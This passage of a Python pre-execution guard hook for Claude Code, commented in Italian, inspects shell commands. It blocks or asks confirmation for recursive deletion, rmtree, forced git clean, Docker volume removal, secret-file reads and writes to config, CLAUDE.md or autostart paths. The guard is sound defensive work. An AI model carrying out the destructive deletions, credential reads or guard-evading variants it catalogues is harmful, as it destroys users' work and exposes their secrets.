    testo = _hd.togli(command, lambda h: h.quotato and h.inerte())
    if "rmtree" not in testo or "shutil" not in testo or not _PYTHON_RE.search(testo):
        return []
    # `from shutil import rmtree as r` e poi `r(...)`: l'alias cancella come rmtree (20/10/2026, #3525).
    for alias in _RMTREE_ALIAS_RE.findall(testo):
        testo += "\n" + re.sub(r"\b" + re.escape(alias) + r"\s*\(", "rmtree(", testo)
    bersagli = []
    for m in _RMTREE_RE.finditer(testo):
        if m.group(1):
            bersagli.append(m.group(2))
        elif m.group(3) and re.search(r"\b" + re.escape(m.group(3)) + r"\s*=\s*tempfile\.mkdtemp\s*\(", testo):
            bersagli.append(_TEMPORANEA)  # una cartella appena creata da tempfile: è temporanea
        else:
            bersagli.append(None)
    return bersagli


# Le opzioni di git prima del sottocomando che prendono un valore staccato.
_GIT_OPZIONI_CON_VALORE = frozenset(("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path",
                                     "--config-env", "--super-prefix"))


def _git_clean_forzato(command):
    """`git clean` con -f o --force e senza -n/--dry-run, anche con opzioni di git in mezzo
    (`git -C dir clean -fdx`). Cancella i file non tracciati: git non li sa ridare."""
    for nome, args in _forma().programmi(command):
        if nome != "git":
            continue
        i, senza_obbligo = 0, False
        while i < len(args) and args[i].startswith("-"):
            # `git -c clean.requireForce=false clean` cancella anche senza -f (20/10/2026, #3525).
            if args[i] == "-c" and i + 1 < len(args) and \
                    args[i + 1].replace(" ", "").lower() in ("clean.requireforce=false", "clean.requireforce=0",
                                                             "clean.requireforce=no", "clean.requireforce=off"):
                senza_obbligo = True
            i += 2 if args[i] in _GIT_OPZIONI_CON_VALORE else 1
        if i >= len(args) or args[i] != "clean":
            continue
        corte, lunghe = "", []
        resto = args[i + 1:]
        k = 0
        while k < len(resto):
            a = resto[k]
            if a == "--":
                break
            if a.startswith("--"):
                lunghe.append(a.split("=", 1)[0])
                if a in ("--exclude",):
                    k += 1  # il valore staccato di --exclude non è un'opzione
            elif a.startswith("-"):
                # -e prende un valore attaccato o staccato: `-enode_modules` non contiene un -n.
                gruppo = a[1:]
                if "e" in gruppo:
                    corte += gruppo[:gruppo.index("e")]
                    if gruppo.endswith("e"):
                        k += 1
                else:
                    corte += gruppo
            k += 1
        # git accetta l'inizio di un'opzione lunga se non è ambiguo: `--forc` è `--force`.
        forza = "f" in corte or any(len(o) > 2 and "--force".startswith(o) for o in lunghe) or senza_obbligo
        prova = "n" in corte or any(len(o) > 2 and "--dry-run".startswith(o) for o in lunghe)
        if forza and not prova:
            return True
    return False


_REDIREZIONE_RE = re.compile(r"^(?:\d*|&)(?:>>?|<)")
_REDIREZIONE_SOLA_RE = re.compile(r"^(?:\d*|&)(?:>>?|<)$")


def _rm_segments(command):
    """(bersagli, cd dichiarato) per ogni `rm` ricorsivo; bersagli None per `xargs rm -r`.

    I comandi si leggono con forma_comando.programmi: `rm` col path completo, in
    una subshell o in un blocco `{ }`, dopo `then`/`do`, dietro un wrapper o dentro
    `sh -c` ed `eval` è lo stesso `rm`. Il testo di un heredoc quotato verso python
    o cat non è un comando. `xargs rm -r` ha bersagli che arrivano da stdin.
    """
    forma = _forma()
    out = []
    cwd_decl = None
    for nome, args in forma.programmi(command):
        if nome == "cd" and args:
            cwd_decl = args[0]
            continue
        if nome == "xargs" and "rm" in [os.path.basename(a) for a in args]:
            dopo = args[[os.path.basename(a) for a in args].index("rm") + 1:]
            if forma._ricorsivo(dopo):
                out.append((None, cwd_decl))
            continue
        if nome == "rm":
            recursive = False
            targets = []
            salta = False
            for tk in args:
                # Una redirezione non è un bersaglio: `rm -rf build 2>/dev/null` non cancella
                # /dev/null (19/10/2026). `>` da solo porta con sé la parola che segue.
                if salta:
                    salta = False
                    continue
                if _REDIREZIONE_RE.match(tk):
                    salta = _REDIREZIONE_SOLA_RE.match(tk) is not None
                    continue
                if tk == "--recursive":
                    recursive = True
                elif tk.startswith("-") and tk != "--":
                    if "r" in tk.lower():
                        recursive = True
                elif tk != "--":
                    targets.append(tk)
            if recursive:
                out.append((targets, cwd_decl))
    return out


def _inert_reference(command: str) -> bool:
    if re.search(r"[;&|]|\$\(|`|<\(|>\(", command):
        return False
    return bool(re.match(r"\s*(?:echo|printf|cat)\b", command))


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.loads(sys.stdin.buffer.read().decode("utf-8"))
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0

    if data.get("tool_name") not in ("Bash", "Monitor"):  # Monitor lancia comandi shell (19/10/2026)
        return 0
    command = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(command, str) or not command:
        return 0
    cwd = data.get("cwd") or _home()

    # Il testo che la shell esegue davvero: senza i corpi degli heredoc quotati
    # verso python o cat e senza i messaggi -m che citano un comando.
    testo = _testo_shell(command)
    _ASSEGNATE.clear()
    _ASSEGNATE.update(_assegnazioni(command))

    # 1) Blocco duro
    if not _inert_reference(command):
        for pattern, why in DANGEROUS:
            if re.search(pattern, testo, re.IGNORECASE):
                sys.stderr.write(
                    f"Bloccato: questo comando sembra {why}. "
                    "Non proporre all'utente di eseguirlo a mano: per installare un programma "
                    "indica l'installer o il pacchetto ufficiale. L'assistente non esegue "
                    "operazioni distruttive irreversibili.\n"
                )
                return 2

    # 2) Scrittura shell su config/hook di Claude Code -> ask (auto-modifica guardie)
    if CONFIG_WRITE_RE.search(testo) or _writes_config(testo, cwd):
        return _ask(
            "Scrittura via shell su settings/hook di Claude Code o sull'aggiornamento automatico "
            "di Arturo: modificherebbe le guardie stesse, o cosa si installa da solo. Conferma "
            "solo se stai aggiornando la config di proposito."
        )

    # 2a) Scrittura shell su un CLAUDE.md -> ask (le istruzioni di ogni sessione futura)
    if CLAUDE_MD_WRITE_RE.search(testo) or _writes_config(testo, cwd, _is_claude_md):
        return _ask(
            "Scrittura via shell su un CLAUDE.md: cambierebbe le istruzioni di ogni sessione "
            "futura in quella cartella. Conferma solo se sei tu a volerlo."
        )

    # 2a-bis) Scrittura shell su un percorso di avvio automatico -> ask (persistenza)
    if PERSIST_WRITE_RE.search(testo) or _writes_config(testo, cwd, _is_persistenza):
        return _ask(
            "Scrittura via shell su un git hook o su un servizio di avvio automatico "
            "(LaunchAgents, systemd, autostart): il codice partirebbe da solo a ogni "
            "commit o a ogni accesso. Conferma solo se l'hai chiesto tu."
        )

    # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
    sblocco = UNLOCK_RE.search(testo) or _writes_config(testo, cwd, _is_unlock)
    if sblocco and "claude-md-unlock" in testo and "config-unlock" not in testo:
        return _ask(
            "Sblocco della modifica di CLAUDE.md per questa sessione: Claude potrà "
            "cambiare le istruzioni che segue. Conferma se sei tu ad aver chiesto la modifica."
        )
    if sblocco:
        return _ask(
            "Creazione di un file di unlock che disattiverebbe la protezione "
            "sull'auto-modifica di config/hook. Conferma solo se sei tu a volerlo."
        )

    # 3) Lettura di file segreti via shell -> ask (per-segmento, alta precisione)
    if _reads_secret(command):
        return _ask(
            "Lettura di un file segreto via shell (chiave privata, credenziali, "
            "~/.ssh, ~/.aws...). Conferma solo se serve davvero: il contenuto "
            "finirebbe nel contesto e potrebbe essere esfiltrato."
        )

    # 3-bis) sed che scrive col comando `w` -> ask
    if _sed_scrive(command):
        return _ask(
            "sed scrive su file col comando `w` (vale anche sotto -n e come flag "
            "di s///): il file indicato viene sovrascritto. Conferma solo se la "
            "scrittura è voluta."
        )

    # 4) Docker distruttivo su volumi -> ask
    if DOCKER_DESTRUCTIVE_RE.search(command):
        return _ask(
            "Rimozione di volumi Docker (dati persistenti). Irreversibile: "
            "conferma solo se vuoi davvero cancellare i dati dei container."
        )

    # 5) rm ricorsivo -> ask, tranne cartelle rigenerabili e file temporanei.
    # Chi usa Arturo spesso non programma: una cartella di capitoli o i Documenti
    # valgono quanto la config, e sul terminale non c'è cestino.
    try:
        for targets, cwd_decl in _rm_segments(command):
            if targets is None:
                return _ask(
                    "rm ricorsivo dietro xargs: i percorsi arrivano da un altro comando e "
                    "non si possono controllare prima. Conferma solo se sai cosa cancella."
                )
            base_cwd = _resolve(cwd_decl, cwd) if cwd_decl else os.path.normpath(cwd)
            for t in (targets or ["."]):
                if t in BARE_TARGETS:
                    p = os.path.normpath(base_cwd) if base_cwd else None
                else:
                    p = _resolve(t, base_cwd)
                if _is_protected_tree(p):
                    return _ask(
                        f"rm ricorsivo su un percorso protetto ({p}): memoria, "
                        "progetti o config di Claude Code. Irreversibile: dal terminale "
                        "non passa dal cestino. Conferma solo se vuoi davvero cancellarlo."
                    )
                if p is None:
                    return _ask(
                        f"rm ricorsivo su un percorso che non so risolvere ({t}). "
                        "Irreversibile: controlla la cartella prima di confermare."
                    )
                if not (_rigenerabile(p) or _temporaneo(p)):
                    return _ask(
                        f"rm ricorsivo su una cartella ({p}). Dal terminale non passa "
                        "dal cestino: se dentro c'è lavoro tuo, lo perdi. Conferma solo "
                        "se vuoi davvero cancellarla."
                    )
    except Exception:
        return _ask("rm ricorsivo che la guardia non riesce a leggere: controlla prima di confermare.")

    # 6) find che cancella -> ask
    try:
        cancella = _find_delete(command)
    except Exception:
        cancella = "find" in command  # come rm e rmtree: un find che la guardia non legge si controlla
    if cancella:
        return _ask(
            "find con -delete o -exec rm cancella file in blocco, senza cestino. "
            "Conferma solo se hai controllato cosa trova."
        )

    # 7) shutil.rmtree -> ask, come rm ricorsivo: tranne cartelle rigenerabili e file temporanei.
    try:
        for t in _rmtree_bersagli(command):
            if t == _TEMPORANEA:
                continue
            p = _resolve(t, os.path.normpath(cwd)) if t else None
            if p is None:
                return _ask(
                    "shutil.rmtree su un percorso che arriva da una variabile: cancella una cartella "
                    "intera, senza cestino. Controlla quale prima di confermare."
                )
            if _is_protected_tree(p) or not (_rigenerabile(p) or _temporaneo(p)):
                return _ask(
                    f"shutil.rmtree su una cartella ({p}): la cancella intera, senza cestino. Se dentro "
                    "c'è lavoro tuo, lo perdi. Conferma solo se vuoi davvero cancellarla."
                )
    except Exception:
        return _ask("shutil.rmtree che la guardia non riesce a leggere: controlla prima di confermare.")

    # 8) git clean -f -> ask: i file non tracciati non stanno in nessun commit.
    if _git_clean_forzato(command):
        return _ask(
            "git clean -f cancella i file che git non traccia: non stanno in nessun commit e non "
            "tornano indietro. Prova prima con `git clean -n` per vedere cosa toglie."
        )

    return 0


if __name__ == "__main__":
    # Claude Code scrive e legge in UTF-8. Su Windows la pipe è in cp1252 (16/10/2026).
    for _flusso in (sys.stdout, sys.stderr):
        try:
            _flusso.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass
    sys.exit(main())
